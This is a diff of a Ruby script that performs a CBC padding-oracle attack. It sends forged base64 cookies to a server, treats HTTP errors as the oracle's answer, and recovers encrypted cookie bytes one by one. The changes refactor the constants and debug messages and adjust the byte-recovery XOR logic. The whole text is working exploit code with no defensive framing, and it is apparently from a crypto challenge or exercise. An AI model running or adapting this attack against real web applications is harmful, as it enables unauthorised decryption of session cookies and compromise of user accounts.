@@ -2,6 +2,7 @@ require 'base64'
 require 'open-uri'
 
 BLOCK_SIZE = 16
+LAST_BYTE = BLOCK_SIZE-1
 
 def debug(msg)
   $stderr.puts msg
@@ -17,7 +18,7 @@ module Oracle
       open(URL, 'Cookie' => "user=\"#{encoded}\"")
       debug "Server accepts the cookie #{encoded}"
       true
-    rescue OpenURI::HTTPError => ex
+    rescue OpenURI::HTTPError
       false
     end
   end
@@ -31,47 +32,47 @@ module Oracle
   end
 
   def last_word(block)
-    decoded = Array.new(16) { rand(0xff) }
+    decoded = Array.new(LAST_BYTE+1) { rand(0xff) }
 
     (0..0xff).to_a.shuffle.each do |x|
       decoded[-1] = x
       break if test_helper(decoded, block)
     end
 
-    (1..15).to_a.reverse.each do |n|
+    (1..LAST_BYTE).to_a.reverse.each do |n|
       r = decoded
-      r[15-n] ^= 1
+      r[LAST_BYTE-n] ^= 1
       unless test_helper(r, block)
-        (15-n..15).each do |x|
+        (LAST_BYTE-n..LAST_BYTE).each do |x|
           decoded[x] ^= n
         end
-        return [decoded, 15 - n]
+        return [decoded, LAST_BYTE - n]
       end
     end
 
     decoded[-1] ^= 1
 
-    [decoded, 15]
+    [decoded, LAST_BYTE]
   end
 
   def decrypt_block(block)
-    decoded, jj = last_word(block)
+    decoded, last_byte_recovered = last_word(block)
 
-    debug jj
+    debug "Last byte decrypted: #{last_byte_recovered}"
 
-    r = decoded
-    (1..jj).to_a.reverse.each do |j|
-      (j..15).each do |k|
-        r[k] = decoded[k] ^ (15 - j)
+    (1..last_byte_recovered).to_a.reverse.each do |j|
+      r = Array.new(LAST_BYTE+1) { rand(0xff) }
+      (j..LAST_BYTE).each do |k|
+        r[k] = decoded[k] ^ (LAST_BYTE - j + 2)
       end
       (0..0xff).to_a.shuffle.each do |x|
         r[j-1] = x
         if test_helper(r, block)
-          debug "j: #{j}"
+          debug "Decrypted byte #{j}"
           break
         end
       end
-      decoded[j-1] = r[j-1] ^ (15 - j)
+      decoded[j-1] = r[j-1] ^ (LAST_BYTE - j + 2)
     end
 
     decoded.pack('C*')
